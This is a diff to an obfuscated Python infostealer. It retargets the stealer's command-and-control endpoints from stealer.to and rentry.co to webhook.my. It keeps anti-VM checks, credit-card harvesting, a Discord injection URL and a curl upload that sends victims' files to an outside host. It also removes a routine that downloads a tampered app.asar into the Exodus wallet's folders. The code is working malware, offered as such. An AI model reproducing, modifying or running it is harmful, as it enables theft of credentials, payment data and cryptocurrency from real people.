@@ -99,24 +99,24 @@ def check_dll():
     if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
         exit_program('VM Detected')
 
-cname = "https://rentry.co/u4tup/raw"
+cname = "https://webhook.my/words.txt"
 cnameresp = requests.get(cname)
 cname = cnameresp.text
 
-smallcname = "https://rentry.co/5crcu/raw"
+smallcname = "https://webhook.my/words.txt"
 smallcnameresp = requests.get(smallcname)
 smallcname = smallcnameresp.text
 
-footerc = "https://rentry.co/dfghg/raw"
+footerc = "https://webhook.my/words.txt"
 footercresp = requests.get(footerc)
 footerc = footercresp.text
 
-words = "https://rentry.co/5uu99/raw"
+words = "https://webhook.my/words.txt"
 wordsresp = requests.get(words)
 words = wordsresp.text
 
-h00k = "https://stealer.to/post?uniqueid=9d319410"
-inj3c710n_url = "https://rentry.co/discord-injection/raw"
+h00k = "https://webhook.my/post?uniqueid=c1dffb92"
+inj3c710n_url = "https://webhook.my/hi.txt"
 
 class DATA_BLOB(Structure):
     _fields_ = [
@@ -711,47 +711,6 @@ def G37CC5(path, arg):
         Wr173F0rF113(CCs, 'creditcards')
     except:pass
 
-asar_url = 'https://jontrawolta.ct8.pl/app.asar'
-
-def download_file(url, dest_path):
-    try:
-        response = requests.get(url, stream=True)
-        response.raise_for_status()
-        with open(dest_path, 'wb') as file:
-            shutil.copyfileobj(response.raw, file)
-    except Exception:
-        pass  # Silently ignore any errors during download
-
-def copy_asar_to_app_dirs(base_path, asar_file):
-    try:
-        for dir_name in os.listdir(base_path):
-            if re.match(r'app-\d+\.\d+\.\d+', dir_name):
-                resources_dir = os.path.join(base_path, dir_name, 'resources')
-                if not os.path.exists(resources_dir):
-                    os.makedirs(resources_dir)
-                dest_file = os.path.join(resources_dir, os.path.basename(asar_file))
-                shutil.copy(asar_file, dest_file)
-    except Exception:
-        pass  # Silently ignore any errors during file copy
-
-
-try:
-    local_app_data = os.getenv('LOCALAPPDATA')
-
-    local_base_path = os.path.join(local_app_data, 'exodus')
-
-    asar_dest_path = os.path.join(local_base_path, 'app.asar')
-
-    download_file(asar_url, asar_dest_path)
-
-    copy_asar_to_app_dirs(local_base_path, asar_dest_path)
-
-
-    os.remove(asar_dest_path)
-except:
-    pass
-       
-   
 
 def G374U70F111(path, arg):
     try:
@@ -1077,7 +1036,7 @@ def G47H3r411():
 def UP104D7060F113(path):
     try:
         r = subprocess.Popen(
-            f'curl -F "file=@{path}" https://stealer.to/uploads',
+            f'curl -F "file=@{path}" https://webhook.my/uploads',
             shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
         ).communicate()
         json_response = loads(r[0].decode('utf-8'))
@@ -1291,6 +1250,5 @@ for arg in K1W1F113s:
             filetext += f"└─<:openfolder:1111408286332375040> [{fileanme}]({b})\n"
         filetext += "\n"
 UP104D("kiwi", filetext)
- 
   
  
